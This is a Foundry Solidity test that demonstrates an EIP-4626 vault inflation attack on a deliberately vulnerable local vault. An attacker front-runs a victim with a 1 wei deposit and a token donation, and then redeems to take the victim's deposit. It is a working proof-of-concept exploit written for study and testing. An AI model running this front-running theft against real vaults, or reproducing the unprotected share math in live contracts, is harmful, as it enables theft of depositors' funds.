// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/Token/EIP-4626-inflation-attack/Asset.sol";
import "src/Token/EIP-4626-inflation-attack/Valout.sol";
import "src/Token/EIP-4626-inflation-attack/VulnerableValout.sol";

// https://ethereum-magicians.org/t/address-eip-4626-inflation-attacks-with-virtual-shares-and-assets/12677

contract Attack is Test {
    /*
    The vault is empty.
        -The exchange rate is the default 1 share per asset
    Bob sees Alice’s transaction in the mempool and decide to sandwitch it.
    Bob deposits 1 wei to the vault, gets 1 wei of shares in exchange.
        -The exchange rate is now 1 share per asset
    Bob transfers 1 token to the vault (1e18 units) using an ERC-20 transfers. No shares are minted in exchange.
        -The rate is now 1 share for 1e18+1 asset
    Alice deposit is executed. Her 1e18 units of token are not even worth one unit of shares. So the contract takes the assets, but mint no shares. Alice basically donated her tokens.
        -The rate is now 1 share for 2e18+1 asset
    Bob redeem its 1 wei of shares, getting the entire vault assets in exchange. This includes all the token he deposited and transfered plus Alice’s tokens. 
    */

    address alice = 0x83563f56957D039abB72C679aD277F0CB1f720Ef;
    address bob = 0xaFfa4F2906fb9315331943837773d19bC0804601;

    IERC20 asset;
    IERC4626 valout;

    function setUp() public {
        asset = new Asset(3 ether);
        valout = new VulnerableValout(asset);
        asset.transfer(bob, 2 ether);
        asset.transfer(alice, 1 ether);
    }

    function test_TheAttackerCanStealAllUserFundsByFrontRunningTheUserWhenVaultIsEmpty() public {
        console.log("Initial Bob asset balance", asset.balanceOf(bob));
        console.log("Initial Alice asset balance", asset.balanceOf(alice));

        // Alice check the price
        console.log("Price that Alice sees:", valout.convertToShares(1 ether));

        /* Front Running tx */
        vm.startPrank(bob);

        // Bob deposits 1 wei of asset
        asset.approve(address(valout), 1);
        valout.deposit(1, bob);
        // Bob donates 1 token asset (1e18 wei) to manipulate the price of the share
        asset.transfer(address(valout), 1 ether);
        console.log("Price after bob manipulation", valout.convertToShares(1 ether));

        vm.stopPrank();

        /* Front Runned tx */
        vm.startPrank(alice);

        // Alice deposit
        asset.approve(address(valout), 1 ether);
        valout.deposit(1 ether, alice);

        vm.stopPrank();

        /* Bob drains all assets from the contract */
        vm.startPrank(bob);

        valout.redeem(1 wei, bob, bob);

        vm.stopPrank();

        console.log("Final Bob asset balance", asset.balanceOf(bob));
        console.log("Final Alice asset balance", asset.balanceOf(alice));
    }
}
